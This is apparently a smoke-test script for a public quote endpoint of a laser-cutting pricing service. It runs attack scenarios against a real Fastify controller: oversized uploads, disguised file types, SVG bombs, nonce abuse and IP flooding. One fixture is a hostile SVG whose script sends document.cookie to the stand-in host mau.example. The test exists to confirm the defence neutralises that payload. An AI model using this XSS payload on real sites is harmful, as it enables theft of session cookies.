/**
 * SMOKE DO LINK PÚBLICO DE ORÇAMENTO — os cenários de ataque, um por linha.
 *
 * Sobe um Fastify DE VERDADE, com o multipart registrado com os MESMOS 1,5 GB
 * globais de `src/server.ts`, e dispara contra o controller real cada vetor da
 * tabela de ameaças da F6. As bordas (banco, Redis, upvox, SMTP) são falsas —
 * o que está sob teste é a defesa, não a infraestrutura.
 *
 * Serve para duas coisas:
 *   1. ver de olho, numa tabela, o status que cada ataque recebe;
 *   2. flagrar regressão sem depender de banco: se alguém apagar o `limits` do
 *      `request.parts()`, a linha "arquivo de 9 MB" vira 200 e a tabela mostra.
 *
 * Uso:
 *   npx tsx scripts/_smoke-public-quote.ts
 */
import multipart from '@fastify/multipart';
import { type FastifyInstance, fastify } from 'fastify';
import {
	makePublicQuoteControllers,
	type PublicQuoteDeps,
} from '../src/controllers/public-quote.js';
import { buildBox } from '../src/lib/cad/generators/box.js';
import { sketchToDxf } from '../src/lib/cad/render-dxf.js';
import { issueNonce } from '../src/lib/public-quote.js';
import type { CollectionEntry } from '../src/repositories/tool-collection.js';

/* ─────────────────────────── bordas falsas ─────────────────────────── */

const OWNER = '11111111-1111-4111-8111-111111111111';
const SLUG = 'metalurgica-silva';
const PERFIL = '22222222-2222-4222-8222-222222222222';

const base = {
	id: 'x',
	tool_key: 'central_custos',
	collection: 'links',
	description: null,
	category: null,
	position: 0,
	active: true,
	status: 'approved' as const,
	review_note: null,
	owner_id: OWNER,
	visibility: 'owner' as const,
	score: null,
	stats: {},
	created_at: '2026-01-01T00:00:00Z',
	updated_at: '2026-01-01T00:00:00Z',
	example_before_url: null,
	example_after_url: null,
};

const LINK: CollectionEntry = {
	...base,
	title: 'Metalúrgica Silva',
	data: {
		slug: SLUG,
		titulo: 'Orçamento na hora',
		email: 'dono@example.com',
		perfil_id: PERFIL,
		materiais_permitidos: 'mdf',
		espessuras_permitidas: '3|6|9',
		qtd_max: 100,
		pedir_lead: true,
		mostrar_prazo: true,
		teto_dia: 30,
		teto_mes: 300,
		ativo: true,
	},
};

const MATERIAL: CollectionEntry = {
	...base,
	id: 'mat-1',
	collection: 'materiais',
	title: 'MDF cru',
	visibility: 'public',
	data: {
		familia: 'mdf',
		densidade_g_cm3: 0.75,
		preco_kg: 12.5,
		chapa_w_mm: 2750,
		chapa_h_mm: 1830,
		espessuras: '3|6|9|12',
		laser: 'co2',
	},
};

const PERFIL_ROW: CollectionEntry = {
	...base,
	id: PERFIL,
	collection: 'perfis',
	title: 'Minha máquina',
	data: {
		laser: 'co2',
		potencia_w: 130,
		v_grav_mm_s: 300,
		line_mm: 0.1,
		markup_pct: 120,
		imposto_pct: 6,
		pedido_minimo: 0,
		prazo_base_dias: 4,
		material_basis: 'bbox',
	},
};

const DOC = {
	collections: {
		materiais: { fields: [] },
		velocidades: {
			fields: [],
			nearest: { on: ['espessura_mm', 'potencia_w'], groupBy: ['material'] },
		},
		perfis: { fields: [] },
	},
};

/**
 * O motor de preço é o REAL (`quote.price`), e ele lê as coleções pelo
 * repositório com `import()` dinâmico. Para rodar sem banco:
 *
 *   1. variáveis de ambiente de mentira, para `lib/supabase.js` e
 *      `lib/tool-definitions.js` CARREGAREM (os dois lançam no topo do módulo
 *      quando falta env) — nada é chamado de verdade;
 *   2. os métodos do repositório-singleton são substituídos depois do import.
 *      Como o bloco importa o MESMO módulo, ele recebe o objeto já trocado.
 *
 * É deliberado que só a BORDA seja falsa: o que este smoke tem de provar é a
 * defesa e o cálculo, não a infraestrutura.
 */
process.env.SUPABASE_URL ??= 'http://localhost:54321';
process.env.SUPABASE_SERVICE_ROLE_KEY ??= 'smoke';
process.env.UPVOX_SUPABASE_URL ??= 'http://localhost:54321';
process.env.UPVOX_SUPABASE_SERVICE_ROLE_KEY ??= 'smoke';
process.env.EXTERNAL_API_URL ??= 'http://localhost:4000';

async function trocaRepositorio(): Promise<void> {
	const mod = await import('../src/repositories/tool-collection.js');
	Object.assign(mod.toolCollectionRepository, {
		list: async () => ({
			items: [MATERIAL],
			total: 1,
			page: 1,
			pageSize: 1,
			pages: 1,
		}),
		nearest: async () => [],
		findById: async () => PERFIL_ROW,
		create: async () => undefined,
	});
}

const estado = {
	cobrancas: 0,
	emails: 0,
	leads: 0,
	semSaldo: false,
	agora: 1_800_000_000_000,
};
const contadores = new Map<string, number>();
const cacheado = new Map<string, unknown>();

const deps: PublicQuoteDeps = {
	findLink: async (slug) => (slug === SLUG ? LINK : null),
	linkAtivo: (e) => e.active !== false && e.data?.ativo !== false,
	listMateriais: async () => [MATERIAL],
	loadToolDoc: async () => DOC,
	createLead: async () => {
		estado.leads++;
	},
	charge: async () => {
		estado.cobrancas++;
		if (estado.semSaldo) {
			return {
				ok: false,
				semSaldo: true,
				status: 402,
				detalhe: 'insufficient_voxes',
			};
		}
		return {
			ok: true,
			invocationId: '33333333-3333-4333-8333-333333333333',
			voxesSpent: 2,
			balance: 100,
			replayed: false,
		};
	},
	incr: async (key) => {
		const n = (contadores.get(key) ?? 0) + 1;
		contadores.set(key, n);
		return n;
	},
	cacheAside: async (key, _ttl, fn) => {
		if (cacheado.has(key)) return cacheado.get(key) as never;
		const v = await fn();
		cacheado.set(key, v);
		return v;
	},
	avisaDono: () => {
		estado.emails++;
	},
	agora: () => estado.agora,
};

/* ───────────────────────────── fixtures ───────────────────────────── */

const SVG_OK = `<svg xmlns="http://www.w3.org/2000/svg" width="100mm" height="50mm" viewBox="0 0 100 50"><rect x="0" y="0" width="100" height="50"/></svg>`;

const SVG_HOSTIL = `<svg xmlns="http://www.w3.org/2000/svg" width="50mm" height="50mm" viewBox="0 0 50 50" onload="alert(1)">
<script>fetch('http://mau.example/'+document.cookie)</script>
<foreignObject width="10" height="10"><body>x</body></foreignObject>
<image href="http://mau.example/x.png" width="10" height="10"/>
<use xlink:href="http://mau.example/x.svg#a"/>
<rect x="0" y="0" width="50" height="50"/></svg>`;

const DXF_OK = sketchToDxf(
	buildBox({
		dim_mode: 'externo',
		largura: 120,
		profundidade: 90,
		altura: 40,
		espessura: 3,
		material: 'MDF',
		tampa: 'encaixe',
		fundo: true,
	}),
);

function svgBomba(n: number): string {
	const r: string[] = [];
	for (let i = 0; i < n; i++)
		r.push(`<rect x="${i % 200}" y="1" width="1" height="1"/>`);
	return `<svg xmlns="http://www.w3.org/2000/svg" width="200mm" height="200mm" viewBox="0 0 200 200">${r.join('')}</svg>`;
}

const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const NOVE_MB = Buffer.concat([
	Buffer.from('  0\r\nSECTION\r\n  2\r\nENTITIES\r\n'),
	Buffer.alloc(9 * 1024 * 1024, 0x41),
]);

/* ───────────────────────────── plumbing HTTP ───────────────────────────── */

const BOUNDARY = '----smokePublicQuote';

function corpo(
	campos: Record<string, string>,
	arquivo?: { nome: string; conteudo: Buffer | string; mime?: string },
): Buffer {
	const p: Buffer[] = [];
	for (const [k, v] of Object.entries(campos)) {
		p.push(
			Buffer.from(
				`--${BOUNDARY}\r\nContent-Disposition: form-data; name="${k}"\r\n\r\n${v}\r\n`,
			),
		);
	}
	if (arquivo) {
		p.push(
			Buffer.from(
				`--${BOUNDARY}\r\nContent-Disposition: form-data; name="arquivo"; filename="${arquivo.nome}"\r\nContent-Type: ${arquivo.mime ?? 'application/octet-stream'}\r\n\r\n`,
			),
		);
		p.push(
			Buffer.isBuffer(arquivo.conteudo)
				? arquivo.conteudo
				: Buffer.from(arquivo.conteudo, 'utf8'),
		);
		p.push(Buffer.from('\r\n'));
	}
	p.push(Buffer.from(`--${BOUNDARY}--\r\n`));
	return Buffer.concat(p);
}

/** Nonce legítimo: emitido agora e "envelhecido" além dos 3 s mínimos. */
function nonceBom(): string {
	const n = issueNonce(SLUG, estado.agora);
	estado.agora += 5_000;
	return n;
}

function pedido(over: Record<string, string> = {}) {
	return {
		nonce: nonceBom(),
		material: 'mdf',
		espessura_mm: '3',
		qtd: '10',
		nome: 'Cliente Final',
		whatsapp: '11999998888',
		consentimento: 'true',
		...over,
	};
}

let app: FastifyInstance;

/**
 * Cada cenário é um VISITANTE DIFERENTE, então os contadores por IP zeram entre
 * eles. Sem isto o teto por IP (6/h, conferido antes de ler o corpo) barraria o
 * sétimo cenário em diante e a tabela viraria uma coluna de 429 — que é o
 * comportamento certo do produto e a leitura errada do smoke. O cenário de
 * flood passa `mesmoVisitante` para acumular de propósito.
 */
async function post(
	campos: Record<string, string>,
	arquivo?: { nome: string; conteudo: Buffer | string; mime?: string },
	opts: { mesmoVisitante?: boolean } = {},
) {
	if (!opts.mesmoVisitante) contadores.clear();
	return app.inject({
		method: 'POST',
		url: `/api/public/quote/${SLUG}/estimate`,
		headers: { 'content-type': `multipart/form-data; boundary=${BOUNDARY}` },
		payload: corpo(campos, arquivo),
	});
}

/* ────────────────────────────── a tabela ────────────────────────────── */

const linhas: {
	vetor: string;
	status: number;
	esperado: number | number[];
	nota: string;
}[] = [];

function anota(
	vetor: string,
	status: number,
	esperado: number | number[],
	nota = '',
) {
	linhas.push({ vetor, status, esperado, nota });
}

async function main() {
	await trocaRepositorio();

	app = fastify();
	await app.register(multipart, { limits: { fileSize: 1500 * 1024 * 1024 } });
	const c = makePublicQuoteControllers(deps);
	app.get('/api/public/quote/:slug', c.info);
	app.post('/api/public/quote/:slug/estimate', c.estimate);
	await app.ready();

	console.log('═'.repeat(86));
	console.log('LINK PÚBLICO DE ORÇAMENTO — smoke dos cenários de ataque');
	console.log('═'.repeat(86));

	/* 0. GET legítimo ---------------------------------------------------- */
	const info = await app.inject({ url: `/api/public/quote/${SLUG}` });
	anota('GET do link (legítimo)', info.statusCode, 200, 'emite o nonce');
	const vazouGet = /custo|markup|densidade|perfil|owner/i.test(info.payload);
	anota(
		'GET não vaza custo/perfil/dono',
		vazouGet ? 500 : 200,
		200,
		vazouGet ? 'VAZOU' : 'limpo',
	);

	/* 1. caminho feliz --------------------------------------------------- */
	const feliz = await post(pedido(), { nome: 'peca.svg', conteudo: SVG_OK });
	anota(
		'POST legítimo (SVG)',
		feliz.statusCode,
		200,
		feliz.statusCode === 200
			? `R$ ${(feliz.json().price_total_cents / 100).toFixed(2)}`
			: feliz.payload.slice(0, 60),
	);

	const felizDxf = await post(pedido({ qtd: '1' }), {
		nome: 'caixa.dxf',
		conteudo: DXF_OK,
	});
	anota('POST legítimo (DXF)', felizDxf.statusCode, 200);

	/* 2. arquivo gigante ------------------------------------------------- */
	const gigante = await post(pedido(), {
		nome: 'bomba.dxf',
		conteudo: NOVE_MB,
	});
	anota(
		'Arquivo de 9 MB (global é 1,5 GB)',
		gigante.statusCode,
		413,
		'override por request',
	);

	/* 3. tipo falso ------------------------------------------------------ */
	const falso = await post(pedido(), {
		nome: 'peca.dxf',
		conteudo: PNG,
		mime: 'image/vnd.dxf',
	});
	anota('PNG renomeado .dxf (mime mente)', falso.statusCode, 415);

	const trocado = await post(pedido(), {
		nome: 'truque.svg',
		conteudo: DXF_OK,
	});
	anota('DXF disfarçado de .svg', trocado.statusCode, 415);

	const exe = await post(pedido(), { nome: 'x.exe', conteudo: SVG_OK });
	anota('Extensão fora da allowlist', exe.statusCode, 415);

	/* 4. SVG hostil ------------------------------------------------------ */
	const hostil = await post(pedido({ qtd: '1' }), {
		nome: 'hostil.svg',
		conteudo: SVG_HOSTIL,
	});
	const sujo = /<script|mau\.example|alert\(|onerror|document\.cookie/i.test(
		hostil.payload,
	);
	anota(
		'SVG hostil (script/XXE/use/image)',
		hostil.statusCode,
		200,
		sujo ? 'VAZOU PAYLOAD' : 'resposta inerte',
	);

	/* 5. bomba de expansão ----------------------------------------------- */
	const bomba = await post(pedido({ qtd: '1' }), {
		nome: 'bomba.svg',
		conteudo: svgBomba(25_000),
	});
	anota(
		'SVG com 25k elementos',
		bomba.statusCode,
		413,
		bomba.statusCode === 500 ? '500 = REGRESSÃO' : 'teto do leitor → 413',
	);

	/* 6. bot ------------------------------------------------------------- */
	const cobrouAntes = estado.cobrancas;
	const mel = await post(pedido({ website: 'http://spam.example' }), {
		nome: 'peca.svg',
		conteudo: SVG_OK,
	});
	anota(
		'Honeypot preenchido',
		mel.statusCode,
		200,
		estado.cobrancas === cobrouAntes
			? '200 vazio, nada cobrado'
			: 'COBROU — REGRESSÃO',
	);

	const semNonce = await post(
		{ material: 'mdf', espessura_mm: '3', qtd: '1' },
		{ nome: 'peca.svg', conteudo: SVG_OK },
	);
	anota('Nonce ausente', semNonce.statusCode, 400);

	const velho = issueNonce(SLUG, estado.agora);
	estado.agora += 31 * 60 * 1000;
	const expirado = await post(
		{ ...pedido(), nonce: velho },
		{ nome: 'peca.svg', conteudo: SVG_OK },
	);
	anota('Nonce expirado (31 min)', expirado.statusCode, 400);

	const agorinha = issueNonce(SLUG, estado.agora);
	estado.agora += 800;
	const rapido = await post(
		{
			nonce: agorinha,
			material: 'mdf',
			espessura_mm: '3',
			qtd: '1',
		},
		{ nome: 'peca.svg', conteudo: SVG_OK },
	);
	anota(
		'POST 0,8 s depois do GET',
		rapido.statusCode,
		400,
		'humano leva > 3 s',
	);

	const deOutro = issueNonce('outro-link', estado.agora);
	estado.agora += 5_000;
	const cruzado = await post(
		{ ...pedido(), nonce: deOutro },
		{ nome: 'peca.svg', conteudo: SVG_OK },
	);
	anota('Nonce de outro link', cruzado.statusCode, 400, 'HMAC casa com o slug');

	/* 7. cardápio -------------------------------------------------------- */
	const outroMat = await post(pedido({ material: 'titânio' }), {
		nome: 'peca.svg',
		conteudo: SVG_OK,
	});
	anota('Material fora do cardápio', outroMat.statusCode, 400);

	const outraEsp = await post(pedido({ espessura_mm: '18' }), {
		nome: 'peca.svg',
		conteudo: SVG_OK,
	});
	anota('Espessura fora do cardápio', outraEsp.statusCode, 400);

	const muito = await post(pedido({ qtd: '999999' }), {
		nome: 'peca.svg',
		conteudo: SVG_OK,
	});
	anota('Quantidade acima do teto', muito.statusCode, 400);

	/* 8. idempotência ---------------------------------------------------- */
	const antesIdem = estado.cobrancas;
	const p = pedido({ qtd: '7' });
	await post(
		{ ...p, nonce: nonceBom() },
		{ nome: 'peca.svg', conteudo: SVG_OK },
	);
	const segunda = await post(
		{ ...p, nonce: nonceBom() },
		{ nome: 'peca.svg', conteudo: SVG_OK },
	);
	anota(
		'Duplo-clique (mesmo pedido)',
		segunda.statusCode,
		200,
		`${estado.cobrancas - antesIdem} cobrança(s) — esperado 1`,
	);

	/* 9. flood ----------------------------------------------------------- */
	// Aqui, e SÓ aqui, as chamadas se acumulam: é o mesmo visitante insistindo.
	contadores.clear();
	let ultimo = 200;
	for (let i = 0; i < 10; i++) {
		const r = await post(
			pedido({ qtd: String(20 + i) }),
			{ nome: 'peca.svg', conteudo: SVG_OK },
			{ mesmoVisitante: true },
		);
		ultimo = r.statusCode;
		if (ultimo === 429) break;
	}
	anota('Flood do mesmo IP', ultimo, 429, 'teto 6/h e 20/dia');

	/* 10. sem saldo do dono ---------------------------------------------- */
	contadores.clear();
	cacheado.clear();
	estado.semSaldo = true;
	const emailsAntes = estado.emails;
	const pobre = await post(pedido({ qtd: '3' }), {
		nome: 'peca.svg',
		conteudo: SVG_OK,
	});
	await new Promise((r) => setImmediate(r));
	const neutra =
		pobre.json().message === 'orcamento_indisponivel' &&
		!/saldo|vox|assinatura/i.test(pobre.payload);
	anota(
		'Dono sem saldo',
		pobre.statusCode,
		402,
		`${neutra ? 'mensagem neutra' : 'VAZOU O MOTIVO'} · ${estado.emails - emailsAntes} e-mail(s) ao dono`,
	);
	estado.semSaldo = false;

	/* ─────────────────────────── impressão ─────────────────────────── */
	console.log();
	const larg = Math.max(...linhas.map((l) => l.vetor.length)) + 2;
	console.log(
		`${'VETOR'.padEnd(larg)}${'STATUS'.padStart(7)}${'ESPERADO'.padStart(10)}   NOTA`,
	);
	console.log('─'.repeat(86));
	let falhas = 0;
	for (const l of linhas) {
		const esperados = Array.isArray(l.esperado) ? l.esperado : [l.esperado];
		const ok = esperados.includes(l.status);
		if (!ok) falhas++;
		console.log(
			`${l.vetor.padEnd(larg)}${String(l.status).padStart(7)}${esperados.join('/').padStart(10)}   ${ok ? '✓' : '✗'} ${l.nota}`,
		);
	}
	console.log('─'.repeat(86));
	console.log(
		`${linhas.length - falhas}/${linhas.length} cenários com o status esperado.`,
	);
	console.log(
		`cobranças no total: ${estado.cobrancas} · leads: ${estado.leads} · e-mails ao dono: ${estado.emails}`,
	);
	console.log('═'.repeat(86));
	await app.close();
	if (falhas > 0) process.exitCode = 1;
}

main().catch((e) => {
	console.error(e);
	process.exit(1);
});
